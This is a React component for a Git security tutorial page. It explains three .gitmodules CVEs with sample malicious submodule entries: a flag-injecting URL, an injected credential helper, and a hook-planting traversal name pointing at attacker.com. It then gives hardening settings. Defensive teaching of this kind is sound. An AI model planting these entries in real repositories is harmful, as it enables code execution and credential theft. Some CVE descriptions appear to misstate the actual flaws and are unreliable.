import { C, Reveal, SectionLabel, SectionHeading, CodeBlock, CheckItem, PlainEnglishBox } from "../../shared.jsx";
import { P } from "./ui.jsx";

const CVES = [
  {
    id: "CVE-2018-17456",
    severity: "CRITICAL",
    severityColor: C.red,
    title: "URL Shell Injection via .gitmodules",
    desc: "Malicious .gitmodules could contain a submodule URL starting with a dash (e.g., -u./payload). When Git spawned the clone subprocess, the URL was interpreted as a command-line flag, allowing arbitrary code execution on clone.",
    plain: "A crafted .gitmodules file could trick Git into running a malicious command when you cloned the repo. Just cloning was enough — no user action needed beyond 'git clone'.",
    code: `# The attack vector (pre-patch):
[submodule "exploit"]
    path = exploit
    url = -u./payload

# Git internally ran:
#   git clone -u./payload exploit
# The -u flag was interpreted as an upload-pack override
# allowing arbitrary command execution

# Fixed in Git 2.19.1 (Oct 2018)
# Validation now rejects URLs starting with '-'`,
    highlights: [2, 3, 4, 7, 8],
  },
  {
    id: "CVE-2023-29007",
    severity: "HIGH",
    severityColor: C.yellow,
    title: "Config Injection via Submodule Deinit",
    desc: "A specially crafted .gitmodules file could inject arbitrary configuration into .git/config when running git submodule deinit. The submodule URL field could contain newlines that created new config sections when copied.",
    plain: "A malicious .gitmodules could sneak extra settings into your local .git/config during deinit. These injected settings could change Git's behavior — like redirecting your pushes to a different server.",
    code: `# The attack: URL with embedded newlines
[submodule "pwned"]
    path = pwned
    url = https://legit.com/repo\\n[credential]\\n\\thelper = !evil-script

# After 'git submodule deinit pwned':
# .git/config would contain:
#   [credential]
#       helper = !evil-script
# → Credentials sent to attacker on next push

# Fixed in Git 2.40.1 (Apr 2023)
# Config values are now sanitized before writing`,
    highlights: [2, 3, 4, 9, 10],
  },
  {
    id: "CVE-2025-48384",
    severity: "HIGH",
    severityColor: C.yellow,
    title: "Path Traversal in Submodule Names",
    desc: "Submodule names containing path traversal sequences (../) could write Git data outside the expected .git/modules/ directory. This could overwrite arbitrary files in the .git/ directory, potentially hijacking hooks or refs.",
    plain: "A submodule named something like '../../hooks/post-checkout' could trick Git into writing files where they shouldn't go — including Git hooks that execute automatically, giving an attacker code execution.",
    code: `# The attack: path traversal in submodule name
[submodule "../../hooks/post-checkout"]
    path = innocent-looking-dir
    url = https://attacker.com/payload.git

# Git would create:
#   .git/modules/../../hooks/post-checkout/
# Which resolves to:
#   .git/hooks/post-checkout
# → Arbitrary hook execution on next checkout

# Fixed in Git 2.49.1 (Jun 2025)
# Submodule names are now validated for traversal`,
    highlights: [2, 3, 4, 7, 8, 9, 10],
  },
];

const PROTECTION_CONFIG = `# ~/.gitconfig — security hardening

[safe]
    directory = /Users/giga/Work     # only trust this directory tree
    # directory = *                  # DO NOT use in personal config

[protocol]
    version = 2

[protocol "file"]
    allow = user                     # restrict file:// protocol

[transfer]
    fsckObjects = true               # verify all incoming objects

[receive]
    fsckObjects = true               # server-side verification too

[fetch]
    fsckObjects = true               # verify on fetch as well

[core]
    symlinks = false                 # ignore symlinks in checkouts
    protectNTFS = true               # block NTFS special names`;

export function SecuritySection() {
  return (
    <section id="s-security" style={{ background: C.surface, borderTop: `1px solid ${C.border}`, borderBottom: `1px solid ${C.border}`, padding: "96px 48px" }}>
      <div style={{ maxWidth: 1100, margin: "0 auto" }}>
        <Reveal>
          <SectionLabel color={C.red}>SECURITY</SectionLabel>
          <SectionHeading sub="Real CVEs that exploited .gitmodules and .gitconfig — and the configuration settings that protect against them.">
            Vulnerabilities & Protections
          </SectionHeading>
        </Reveal>

        {CVES.map((cve, i) => (
          <Reveal key={cve.id} delay={i * 0.12}>
            <div style={{
              background: C.bg, border: `1px solid ${cve.severityColor}30`,
              borderLeft: `4px solid ${cve.severityColor}`, borderRadius: 14,
              overflow: "hidden", marginBottom: 20,
            }}>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1.15fr" }}>
                <div style={{ padding: "24px 24px", borderRight: `1px solid ${C.border}`, display: "flex", flexDirection: "column", gap: 14 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                    <span style={{
                      fontFamily: "'Syne', sans-serif", fontWeight: 800, fontSize: 10,
                      color: cve.severityColor, background: `${cve.severityColor}18`,
                      border: `1px solid ${cve.severityColor}40`, borderRadius: 6,
                      padding: "3px 8px", letterSpacing: "0.1em",
                    }}>
                      {cve.severity}
                    </span>
                    <code style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 12, color: C.muted }}>{cve.id}</code>
                  </div>
                  <div style={{ fontFamily: "'Syne', sans-serif", fontWeight: 700, fontSize: 15, color: C.text }}>
                    {cve.title}
                  </div>
                  <p style={{ fontFamily: "'DM Sans', sans-serif", fontSize: 13, color: C.muted, lineHeight: 1.7, margin: 0 }}>
                    {cve.desc}
                  </p>
                  <PlainEnglishBox color={cve.severityColor}>{cve.plain}</PlainEnglishBox>
                </div>
                <div style={{ padding: "22px 24px", display: "flex", alignItems: "center" }}>
                  <CodeBlock filename={cve.id} highlights={cve.highlights}>{cve.code}</CodeBlock>
                </div>
              </div>
            </div>
          </Reveal>
        ))}

        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 24, marginTop: 8 }}>
          <Reveal delay={0.4}>
            <CodeBlock filename="~/.gitconfig (security)" highlights={[3, 4, 8, 11, 14, 17, 20, 23, 24]}>
              {PROTECTION_CONFIG}
            </CodeBlock>
          </Reveal>

          <Reveal delay={0.5}>
            <div style={{
              background: C.bg, border: `1px solid ${C.border}`, borderRadius: 14,
              padding: "24px 22px",
            }}>
              <div style={{ fontFamily: "'Syne', sans-serif", fontWeight: 700, fontSize: 12, color: C.muted, letterSpacing: "0.12em", marginBottom: 16 }}>
                BEST PRACTICES
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                <CheckItem active delay={0}>Keep Git updated — most CVEs require specific older versions</CheckItem>
                <CheckItem active delay={0.05}>Enable transfer.fsckObjects globally to verify all incoming data</CheckItem>
                <CheckItem active delay={0.1}>Audit .gitmodules in PRs — treat URL/name changes as security-sensitive</CheckItem>
                <CheckItem active delay={0.15}>Use protocol.file.allow = user to block local file:// clone attacks</CheckItem>
                <CheckItem active delay={0.2}>Restrict safe.directory to known paths instead of using wildcard *</CheckItem>
                <CheckItem active={false} delay={0.25}>Disabling submodule support entirely — only if you never use them</CheckItem>
              </div>
            </div>
          </Reveal>
        </div>
      </div>
    </section>
  );
}
